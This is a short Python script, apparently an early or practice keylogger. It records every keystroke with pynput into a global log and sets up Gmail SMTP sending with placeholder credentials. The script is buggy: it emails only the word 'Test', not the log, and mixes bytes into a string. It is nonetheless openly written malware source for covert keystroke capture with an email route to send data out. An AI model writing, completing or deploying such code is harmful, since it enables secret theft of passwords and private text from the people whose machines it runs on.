import pynput.keyboard
import smtplib

log=""

def callback_function(key):
    global log

    try:
        log = log + key.char.encode("utf-8")
        #log = log + str(key.char)

    except AttributeError:
        if key == key.space:
           log = log + " "
        else:
            log = log + str(key)

    #print(log)

def send_email():
    email_server = smtplib.SMTP("smtp.gmail.com",587)
    email_server.starttls()
    email_server.login("email","email_password")
    email_server.sendmail("email","email","Test")
    email_server.quit()

send_email()
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    keylogger_listener.join()